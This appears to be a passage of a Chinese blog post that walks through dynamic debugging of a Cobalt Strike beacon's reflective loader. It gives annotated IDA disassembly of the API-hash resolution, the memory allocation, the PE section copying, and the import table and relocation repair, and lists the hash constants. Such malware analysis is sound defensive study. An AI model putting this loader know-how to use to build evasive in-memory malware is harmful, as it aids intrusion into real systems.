<h3 id="加载功能函数-1"><a href="#加载功能函数-1" class="headerlink" title="加载功能函数"></a>加载功能函数</h3><p>在上面的基础上跳出循环，直接来到特征码（注意跳出上面的hash api寻址的循环，来到下面这一步</p>
<p>第一个识别的特征码是0D3324904h，0D3324904h-&gt;kernel32_GetModuleHandleA，继续同样的操作</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811114028-0ok8xm5.png" alt="image" loading="lazy">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">debug083:<span class="number">00000000035B</span>67CA loc_35B67CA:                            ; CODE XREF: debug083:<span class="number">00000000035B</span>67AB↑j</span><br><span class="line">debug083:<span class="number">00000000035B</span>67CA                 cmp     dword ptr [rsp+<span class="number">4</span>], <span class="number">0</span>D3324904h</span><br><span class="line">debug083:<span class="number">00000000035B</span>67D2                 jnz     <span class="type">short</span> loc_35B67EE</span><br><span class="line">debug083:<span class="number">00000000035B</span>67D4                 mov     rax, [rsp+<span class="number">18</span>h]</span><br><span class="line">debug083:<span class="number">00000000035B</span>67D9                 mov     eax, [rax]</span><br><span class="line">debug083:<span class="number">00000000035B</span>67DB                 mov     rcx, [rsp+<span class="number">8</span>]</span><br><span class="line">debug083:<span class="number">00000000035B</span>67E0                 add     rcx, rax</span><br><span class="line">debug083:<span class="number">00000000035B</span>67E3                 mov     rax, rcx</span><br><span class="line">debug083:<span class="number">00000000035B</span>67E6                 mov     rcx, [rsp+<span class="number">70</span>h]</span><br><span class="line">debug083:<span class="number">00000000035B</span>67EB                 mov     [rcx], rax			<span class="comment">//将kernel32_GetModuleHandleA函数存入rcx寄存器的地址</span></span><br><span class="line">debug083:<span class="number">00000000035B</span>67EE</span><br><span class="line">debug083:<span class="number">00000000035B</span>67EE loc_35B67EE:                            ; CODE XREF: debug083:<span class="number">00000000035B</span>6726↑j</span><br><span class="line">debug083:<span class="number">00000000035B</span>67EE                                         ; debug083:<span class="number">00000000035B</span>6750↑j ...</span><br><span class="line">debug083:<span class="number">00000000035B</span>67EE                 movzx   eax, word ptr [rsp]</span><br><span class="line">debug083:<span class="number">00000000035B</span>67F2                 dec     ax</span><br><span class="line">debug083:<span class="number">00000000035B</span>67F5                 mov     [rsp], ax	<span class="comment">//计数器减一，标志已找到一个功能函数</span></span><br><span class="line">debug083:<span class="number">00000000035B</span>67F9</span><br><span class="line">debug083:<span class="number">00000000035B</span>67F9 loc_35B67F9:                            ; CODE XREF: debug083:<span class="number">00000000035B</span>66CD↑j<span class="comment">//模块表的递进</span></span><br><span class="line">debug083:<span class="number">00000000035B</span>67F9                 mov     rax, [rsp+<span class="number">38</span>h]</span><br><span class="line">debug083:<span class="number">00000000035B</span>67FE                 add     rax, <span class="number">4</span></span><br><span class="line">debug083:<span class="number">00000000035B</span>6802                 mov     [rsp+<span class="number">38</span>h], rax</span><br><span class="line">debug083:<span class="number">00000000035B</span>6807                 mov     rax, [rsp+<span class="number">50</span>h]</span><br><span class="line">debug083:<span class="number">00000000035B</span>680C                 add     rax, <span class="number">2</span></span><br><span class="line">debug083:<span class="number">00000000035B</span>6810                 mov     [rsp+<span class="number">50</span>h], rax</span><br><span class="line">debug083:<span class="number">00000000035B</span>6815                 jmp     loc_35B6628			<span class="comment">//跳回继续hash 寻址</span></span><br></pre></td></tr></table></figure>

<p>7C0DFCAAh-&gt;kernel32_GetProcAddress</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811114220-9ra8mjc.png" alt="image" loading="lazy">​</p>
<p>调试得到：</p>
<p>0EC0E4E8Eh-&gt;kernel32_LoadLibraryA</p>
<p>753A4FCh-&gt;kernel32_LoadLibraryExA</p>
<p>91AFCA54h-&gt;kernel32_VirtualAlloc</p>
<p>7946C61Bh-&gt;kernel32_VirtualProtect</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811114940-00c4p4p.png" alt="image" loading="lazy">​</p>
<p>功能函数加载完毕，存入栈中等待调用</p>
<p>‍</p>
<h2 id="DLL文件重装载"><a href="#DLL文件重装载" class="headerlink" title="DLL文件重装载"></a>DLL文件重装载</h2><h3 id="开辟用于重装载的空间"><a href="#开辟用于重装载的空间" class="headerlink" title="开辟用于重装载的空间"></a>开辟用于重装载的空间</h3><p>在上面步骤之后继续运行返回之后，继续运行，经过一些内存处理之后，开始调用栈中的函数，首次调用函数为 VirtualAlloc，开辟用于重装载的空间</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811132652-7v26ils.png" alt="image" loading="lazy">​</p>
<p>直接步过这个call 然后观察rax寄存器发现开辟的空间首地址，即空间首地址为0000000003610000</p>
<p>栈空间开辟完成之后，进行栈的清理工作，观察rcx发现清空了4E000h长度的内存</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811135522-pilv2lw.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h3 id="PE文件头复制"><a href="#PE文件头复制" class="headerlink" title="PE文件头复制"></a>PE文件头复制</h3><p>继续运行注意这个call loc_3226C93，步入运行到</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811142601-fon62su.png" alt="image" loading="lazy">​</p>
<p>程序将PE文件装载到新开辟的内存空间中，从03610000到0000000003610400，总计0400h；PE头内容（5A 41 52 55 48 89 E5 48……</p>
<p>‍</p>
<h3 id="各区段复制"><a href="#各区段复制" class="headerlink" title="各区段复制"></a>各区段复制</h3><p>将上面存到03610400的PE文件头copy下来，使用010 editor新建成为一个文件，然后去010官网下载exe.bt的模板，运行模板之后得到</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811160409-6vrbu0k.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>根据PE头所标识的节表数量，可知有五节</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811160616-wrw5r0r.png" alt="image" loading="lazy">​</p>
<p>观察5给节区的DWORD SizeOfRawData可知即将载入的内容长度</p>
<p>第一段：观察rdi和rcx可知是从0x03611000到0x363BE00共2AE00h</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811161153-sqr3dnb.png" alt="image" loading="lazy">​</p>
<p>第二段：从0x0363C000到0x0364BA00，总共FA00h</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811161626-lma7hrj.png" alt="image" loading="lazy">​</p>
<p>同样的操作，循环得到</p>
<p>第三段：从0x0364C000到0x0364E600，共2600h</p>
<p>第四段：从0x0365A000到0x0365C200，共2200h</p>
<p>第五段：从0x0365D000到0x0365E000，共1000h</p>
<p>结束之后，区段装载完毕</p>
<p>‍</p>
<h3 id="导入表修复"><a href="#导入表修复" class="headerlink" title="导入表修复"></a>导入表修复</h3><p>目前重装载的PE文件还不完整，还需要进行修复</p>
<p>过程：</p>
<ol>
<li>从导入表复制模块名称</li>
<li>调用kernel32_LoadLibraryA进行模块加载</li>
<li>从导入表复制模块函数名称</li>
<li>调用kernel32_GetProcAddress获取功能函数调用地址</li>
<li>、将函数的调用地址写入新的导入表</li>
</ol>
<p>将源PE文件放入010 Editor解析可知，程序要导入KERNEL32、ADVAPI32、WININET、WS2_32S四个模 块的功能函数</p>
<p>‍</p>
<p>KERNEL32.DLL模块函数的过程分析</p>
<h5 id="修复准备工作"><a href="#修复准备工作" class="headerlink" title="修复准备工作"></a>修复准备工作</h5><p>运行完这个函数返回之后，跟踪程序下一个call，也就是loc_33D6E53的运行可以发现，此程序在此获取：</p>
<ul>
<li>源文件的PE头位置 源PE文件的SizeOfImage</li>
<li>源PE文件的IMAGE_DIRECTORY_ENTRY_IMPORT-&gt;VirtualAddress (导入表的RVA)</li>
<li>重装载PE文件内存空间首地址</li>
</ul>
<p>计算出：</p>
<p>重装载PE文件内存空间最后40h位置，用于临时存储复制的模块名称、功能函数名称等</p>
<p>重装载PE文件导入表存储位置（VA &#x3D; RVA + IMAGE BASE）</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811215852-7ur6ibi.png" alt="image" loading="lazy">​</p>
<p>继续运行开始从导入表中复制模块名称，并按名加载模块</p>
<h5 id="获取模块名称"><a href="#获取模块名称" class="headerlink" title="获取模块名称"></a>获取模块名称</h5><p>此段主要复制重装载PE文件存储的模块名称到指定的临时存储区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">debug079:<span class="number">00000000033</span>D6EC2 loc_33D6EC2:                            ; CODE XREF: debug079:<span class="number">00000000033</span>D70EB↓j</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EC2                 mov     rax, [rsp+<span class="number">38</span>h]  ; 重装载PE文件的导入表存储位置赋值给rax</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EC7                 cmp     dword ptr [rax+<span class="number">0</span>Ch], <span class="number">0</span> ; 检查重装载PE文件IMAGE_IMPORT_DESCRIPTOR ImportDescriptor-&gt;name</span><br><span class="line">debug079:<span class="number">00000000033</span>D6ECB                 jz      loc_33D70F0</span><br><span class="line">debug079:<span class="number">00000000033</span>D6ED1                 mov     rax, [rsp+<span class="number">38</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6ED6                 mov     eax, [rax+<span class="number">0</span>Ch]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6ED9                 mov     rcx, [rsp+<span class="number">88</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EE1                 add     rcx, rax</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EE4                 mov     rax, rcx</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EE7                 mov     rdi, [rsp+<span class="number">20</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EEC                 mov     rsi, rax        ; 复制的源地址:重装载PE文件的模块名称存储位置</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EEF                 mov     ecx, <span class="number">40</span>h ; <span class="string">&#x27;@&#x27;</span></span><br><span class="line">debug079:<span class="number">00000000033</span>D6EF4                 rep movsb               ; 模块名称复制</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EF6                 movzx   r8d, byte ptr [rsp+<span class="number">0</span>A0h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6EFF                 mov     edx, <span class="number">40</span>h ; <span class="string">&#x27;@&#x27;</span></span><br><span class="line">debug079:<span class="number">00000000033</span>D6F04                 mov     rcx, [rsp+<span class="number">20</span>h]  ; RCX指向复制的模块名称</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F09                 call    loc_33D63A3</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F0E                 mov     rcx, [rsp+<span class="number">20</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F13                 mov     rax, [rsp+<span class="number">80</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F1B                 call    qword ptr [rax+<span class="number">10</span>h] ; 调用kernel32_LoadLibraryA</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F1E                 mov     [rsp+<span class="number">98</span>h], rax</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F26                 mov     rax, [rsp+<span class="number">38</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F2B                 mov     eax, [rax]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F2D                 mov     rcx, [rsp+<span class="number">88</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F35                 add     rcx, rax</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F38                 mov     rax, rcx</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F3B                 mov     [rsp+<span class="number">30</span>h], rax</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F40                 mov     rax, [rsp+<span class="number">38</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F45                 mov     eax, [rax+<span class="number">10</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F48                 mov     rcx, [rsp+<span class="number">88</span>h]</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F50                 add     rcx, rax</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F53                 mov     rax, rcx</span><br><span class="line">debug079:<span class="number">00000000033</span>D6F56                 mov     [rsp+<span class="number">28</span>h], rax</span><br></pre></td></tr></table></figure>

<p>在这个代码中间有一个call    loc_33D63A3跟进</p>
<h5 id="模块按名加载"><a href="#模块按名加载" class="headerlink" title="模块按名加载"></a>模块按名加载</h5><p>loc_33D63A3调用kernel32_LoadLibraryA进行模块加载，参数为先前复制到空白区的模块名称存于RAX寄存器的返回值为模块的调用地址，压入栈中等待调用</p>
<h5 id="获取功能函数名称"><a href="#获取功能函数名称" class="headerlink" title="获取功能函数名称"></a>获取功能函数名称</h5><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811224631-3hn7w0u.png" alt="image" loading="lazy">​</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811224956-hecd2sc.png" alt="image" loading="lazy">​</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811225017-n8wx88l.png" alt="image" loading="lazy">​</p>
<p>复制的模块名称为VirtualProtectEx</p>
<p>同样在loc_33D7049下</p>
<h5 id="功能模块按名加载"><a href="#功能模块按名加载" class="headerlink" title="功能模块按名加载"></a>功能模块按名加载</h5><p>到这的时候ida崩了，所以地址随机化可能和前面不一样，以汇编为主</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">debug083:<span class="number">00000000033</span>A707C                 movzx   r8d, byte ptr [rsp+<span class="number">0</span>A0h] ; R8=<span class="number">0</span></span><br><span class="line">debug083:<span class="number">00000000033</span>A7085                 mov     edx, <span class="number">40</span>h ; <span class="string">&#x27;@&#x27;</span></span><br><span class="line">debug083:<span class="number">00000000033</span>A708A                 mov     rcx, [rsp+<span class="number">20</span>h]  ; 存储的函数名称位置，复制的目的地</span><br><span class="line">debug083:<span class="number">00000000033</span>A708F                 call    loc_33A63A3</span><br><span class="line">debug083:<span class="number">00000000033</span>A7094                 mov     rdx, [rsp+<span class="number">20</span>h]  ; 存储的函数名称位置</span><br><span class="line">debug083:<span class="number">00000000033</span>A7099                 mov     rcx, [rsp+<span class="number">98</span>h]</span><br><span class="line">debug083:<span class="number">00000000033</span>A70A1                 mov     rax, [rsp+<span class="number">80</span>h]</span><br><span class="line">debug083:<span class="number">00000000033</span>A70A9                 call    qword ptr [rax+<span class="number">8</span>] ; kernel32_GetProcAddress</span><br><span class="line">debug083:<span class="number">00000000033</span>A70AC                 mov     rcx, [rsp+<span class="number">28</span>h]  ; IAT地址</span><br><span class="line">debug083:<span class="number">00000000033</span>A70B1                 mov     [rcx], rax      ; 将IAT存入</span><br></pre></td></tr></table></figure>

<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811233902-dzkfxhb.png" alt="image" loading="lazy">​</p>
<p>继续执行loc_32570B4，判断是否还有未载入的功能函数</p>
<p>当所有功能函数的调用地址更新进IAT后，程序将直接返回loc_3256F5B段，进行下一个模块的函数加载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">debug081:<span class="number">00000000032570B</span>4 loc_32570B4:                            ; CODE XREF: debug081:<span class="number">0000000003257047</span>↑j</span><br><span class="line">debug081:<span class="number">00000000032570B</span>4                 mov     rax, [rsp+<span class="number">28</span>h]</span><br><span class="line">debug081:<span class="number">00000000032570B</span>9                 add     rax, <span class="number">8</span></span><br><span class="line">debug081:<span class="number">00000000032570B</span>D                 mov     [rsp+<span class="number">28</span>h], rax</span><br><span class="line">debug081:<span class="number">00000000032570</span>C2                 cmp     qword ptr [rsp+<span class="number">30</span>h], <span class="number">0</span> ; 查看INT表</span><br><span class="line">debug081:<span class="number">00000000032570</span>C8                 jz      <span class="type">short</span> loc_32570D8</span><br><span class="line">debug081:<span class="number">00000000032570</span>CA                 mov     rax, [rsp+<span class="number">30</span>h]</span><br><span class="line">debug081:<span class="number">00000000032570</span>CF                 add     rax, <span class="number">8</span></span><br><span class="line">debug081:<span class="number">00000000032570</span>D3                 mov     [rsp+<span class="number">30</span>h], rax</span><br><span class="line">debug081:<span class="number">00000000032570</span>D8</span><br><span class="line">debug081:<span class="number">00000000032570</span>D8 loc_32570D8:                            ; CODE XREF: debug081:<span class="number">00000000032570</span>C8↑j</span><br><span class="line">debug081:<span class="number">00000000032570</span>D8                 jmp     loc_3256F5B</span><br><span class="line">debug081:<span class="number">00000000032570</span>DD ; ---------------------------------------------</span><br></pre></td></tr></table></figure>

<p>每当INT中的函数加载完毕，都将回到程序段loc_3256EC2进行判断（也就是这个函数起始位置），当发现所有模块都已经加载完毕， 就会清理临时存储区，进入文件修复的下一个阶段</p>
<p>‍</p>
<h3 id="重定位表修复"><a href="#重定位表修复" class="headerlink" title="重定位表修复"></a>重定位表修复</h3><p>pe头中数据表第六位是IMAGE_DIRECTORY_ENTRY_BASERELOC，这个中的VirtualAddress保存了重定位表存储位置的RVA，第二个表现Size存储了重定位表的大小</p>
<p>重定位表分成可变长度的块，每块由基地址，表大小和存储的偏移地址组成 基地址+偏移地址&#x3D;VA</p>
<p>修复装载pe文件定位表，步骤：</p>
<ul>
<li>PE文件重定位差值计算</li>
<li>PE文件重定位表存储位置获取</li>
<li>遍历重装载PE文件重定位表修改</li>
</ul>
<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><ul>
<li>修复重定位表是在call loc_3267113</li>
<li>重装载PE文件内存首地址与ImageBase差值的计算，存入[rsp+20h]</li>
<li>源PE文件IMAGE_DIRECTORY_ENTRY_BASERELOC获取，存入[rsp+18h]</li>
<li>重装载PE文件重定位表位置的计算，存入[rsp+10h]</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">debug085:<span class="number">0000000003267113</span> loc_3267113:                            ; CODE XREF: debug085:<span class="number">00000000032662</span>EF↑p</span><br><span class="line">debug085:<span class="number">0000000003267113</span>                 mov     [rsp+<span class="number">10</span>h], rdx  ; 将pe头地址存入[rsp+<span class="number">10</span>h]的栈中</span><br><span class="line">debug085:<span class="number">0000000003267118</span>                 mov     [rsp+<span class="number">8</span>], rcx    ; 将beacon.dll文件地址存入[rsp+<span class="number">8</span>h]的中</span><br><span class="line">debug085:<span class="number">000000000326711</span>D                 sub     rsp, <span class="number">38</span>h</span><br><span class="line">debug085:<span class="number">0000000003267121</span>                 mov     rax, [rsp+<span class="number">48</span>h]  ; F8h-&gt;源PE文件：PE头</span><br><span class="line">debug085:<span class="number">0000000003267126</span>                 mov     rax, [rax+<span class="number">30</span>h]  ; <span class="number">128</span>h-&gt;源PE文件：ImageBase=<span class="number">180000000</span>h</span><br><span class="line">debug085:<span class="number">000000000326712</span>A                 mov     rcx, [rsp+<span class="number">40</span>h]  ; 重装载PE文件内存首地址</span><br><span class="line">debug085:<span class="number">000000000326712F</span>                 sub     rcx, rax        ; 计算出重定位差值：FFFFFFFE80190000h</span><br><span class="line">debug085:<span class="number">0000000003267132</span>                 mov     rax, rcx</span><br><span class="line">debug085:<span class="number">0000000003267135</span>                 mov     [rsp+<span class="number">20</span>h], rax  ; 将重定位差存入[rsp+<span class="number">20</span>h]</span><br><span class="line">debug085:<span class="number">000000000326713</span>A                 mov     eax, <span class="number">8</span>          ; IMAGE_DATA_DIRECTORY size</span><br><span class="line">debug085:<span class="number">000000000326713F</span>                 imul    rax, <span class="number">5</span>          ; IMAGE_DIRECTORY_ENTRY_BASERELOC在数据表第<span class="number">6</span>位</span><br><span class="line">debug085:<span class="number">0000000003267143</span>                 mov     rcx, [rsp+<span class="number">48</span>h]  ; F8h-&gt;源PE文件：PE头</span><br><span class="line">debug085:<span class="number">0000000003267148</span>                 lea     rax, [rcx+rax+<span class="number">88</span>h] ; <span class="number">1</span>A8h-&gt;源PE文件：IMAGE_DIRECTORY_ENTRY_BASERELOC</span><br><span class="line">debug085:<span class="number">0000000003267150</span>                 mov     [rsp+<span class="number">18</span>h], rax  ; [rsp+<span class="number">18</span>h]=源PE文件：IMAGE_DIRECTORY_ENTRY_BASERELOC</span><br><span class="line">debug085:<span class="number">0000000003267155</span>                 mov     rax, [rsp+<span class="number">18</span>h]</span><br><span class="line">debug085:<span class="number">000000000326715</span>A                 cmp     dword ptr [rax+<span class="number">4</span>], <span class="number">0</span> ; 源PE文件：IMAGE_DIRECTORY_ENTRY_BASERELOC-&gt;size?=<span class="number">0</span></span><br><span class="line">debug085:<span class="number">000000000326715</span>E                 jz      loc_326739F</span><br><span class="line">debug085:<span class="number">0000000003267164</span>                 mov     rax, [rsp+<span class="number">18</span>h]  ; <span class="number">4</span>D000h(OPE-&gt;IDEB-&gt;RVA)</span><br><span class="line">debug085:<span class="number">0000000003267169</span>                 mov     eax, [rax]      ; 重装载PE文件内存首地址</span><br><span class="line">debug085:<span class="number">000000000326716B</span>                 mov     rcx, [rsp+<span class="number">40</span>h]  ; 计算出重装载PE文件重定位表位置</span><br><span class="line">debug085:<span class="number">0000000003267170</span>                 add     rcx, rax</span><br><span class="line">debug085:<span class="number">0000000003267173</span>                 mov     rax, rcx</span><br><span class="line">debug085:<span class="number">0000000003267176</span>                 mov     [rsp+<span class="number">10</span>h], rax  ; [rsp+<span class="number">10</span>h]=重装载PE文件重定位表位置</span><br></pre></td></tr></table></figure>

<p>继续调试loc_326717B ，这里进行了：</p>
<ul>
<li>重定位表处理进度的判断</li>
<li>块中偏移地址个数的计算</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">debug085:<span class="number">000000000326717B</span> loc_326717B:                            ; CODE XREF: debug085:<span class="number">000000000326739</span>A↓j</span><br><span class="line">debug085:<span class="number">000000000326717B</span>                 mov     rax, [rsp+<span class="number">10</span>h]</span><br><span class="line">debug085:<span class="number">0000000003267180</span>                 cmp     dword ptr [rax+<span class="number">4</span>], <span class="number">0</span></span><br><span class="line">debug085:<span class="number">0000000003267184</span>                 jz      loc_326739F</span><br><span class="line">debug085:<span class="number">000000000326718</span>A                 mov     rax, [rsp+<span class="number">10</span>h]  ; 重装载PE文件重定位表位置</span><br><span class="line">debug085:<span class="number">000000000326718F</span>                 mov     eax, [rax]      ; 重定位表块基址(RVA：<span class="number">2</span>C000h)</span><br><span class="line">debug085:<span class="number">0000000003267191</span>                 mov     rcx, [rsp+<span class="number">40</span>h]  ; 重装载PE文件内存首地址</span><br><span class="line">debug085:<span class="number">0000000003267196</span>                 add     rcx, rax        ; 重装载PE文件需要重定位块基地址：<span class="number">367</span>C000h</span><br><span class="line">debug085:<span class="number">0000000003267199</span>                 mov     rax, rcx</span><br><span class="line">debug085:<span class="number">000000000326719</span>C                 mov     [rsp+<span class="number">8</span>], rax</span><br><span class="line">debug085:<span class="number">00000000032671</span>A1                 mov     rax, [rsp+<span class="number">10</span>h]  ; 重装载PE文件重定位表位置</span><br><span class="line">debug085:<span class="number">00000000032671</span>A6                 mov     eax, [rax+<span class="number">4</span>]    ; SizeOfBlock=<span class="number">18</span>h</span><br><span class="line">debug085:<span class="number">00000000032671</span>A9                 sub     rax, <span class="number">8</span>          ; VirtualAddress和SizeOfBlock占用<span class="number">8</span>h</span><br><span class="line">debug085:<span class="number">00000000032671</span>AD                 xor     edx, edx</span><br><span class="line">debug085:<span class="number">00000000032671</span>AF                 mov     ecx, <span class="number">2</span>          ; 每个偏移地址占据两字节</span><br><span class="line">debug085:<span class="number">00000000032671B</span>4                 div     rcx             ; 计算出偏移地址个数</span><br><span class="line">debug085:<span class="number">00000000032671B</span>7                 mov     [rsp+<span class="number">18</span>h], rax  ; [rsp+<span class="number">18</span>h]=偏移地址个数，<span class="number">8</span>h</span><br><span class="line">debug085:<span class="number">00000000032671B</span>C                 mov     rax, [rsp+<span class="number">10</span>h]  ; RAX=重装载PE文件重定位表位置</span><br><span class="line">debug085:<span class="number">00000000032671</span>C1                 add     rax, <span class="number">8</span>          ; RAX=重装载PE文件重定位表子偏移地址位置</span><br><span class="line">debug085:<span class="number">00000000032671</span>C5                 mov     [rsp], rax</span><br></pre></td></tr></table></figure>

<p>loc_32671C9进行待处理偏移地址个数的判断，并进行标记为Ah(1010b)的偏移地址 的处理，更新对应的偏移值；IMAGE_REL_BASED_DIR64</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">debug085:<span class="number">00000000032671</span>C9 loc_32671C9:                            ; CODE XREF: debug085:<span class="number">000000000326737</span>D↓j</span><br><span class="line">debug085:<span class="number">00000000032671</span>C9                 mov     rax, [rsp+<span class="number">18</span>h]</span><br><span class="line">debug085:<span class="number">00000000032671</span>CE                 mov     [rsp+<span class="number">28</span>h], rax  ; 偏移地址个数=<span class="number">8</span></span><br><span class="line">debug085:<span class="number">00000000032671</span>D3                 mov     rax, [rsp+<span class="number">18</span>h]</span><br><span class="line">debug085:<span class="number">00000000032671</span>D8                 dec     rax</span><br><span class="line">debug085:<span class="number">00000000032671</span>DB                 mov     [rsp+<span class="number">18</span>h], rax</span><br><span class="line">debug085:<span class="number">00000000032671E0</span>                 cmp     qword ptr [rsp+<span class="number">28</span>h], <span class="number">0</span> ; 偏移地址为<span class="number">0</span>跳转</span><br><span class="line">debug085:<span class="number">00000000032671E6</span>                 jz      loc_3267382   </span><br><span class="line">		debug085:<span class="number">0000000003267382</span> ; ---------------------------------------------------------------------------</span><br><span class="line">		debug085:<span class="number">0000000003267382</span></span><br><span class="line">		debug085:<span class="number">0000000003267382</span> loc_3267382:                            ; CODE XREF: debug085:<span class="number">00000000032671E6</span>↑j</span><br><span class="line">		debug085:<span class="number">0000000003267382</span>                 mov     rax, [rsp+<span 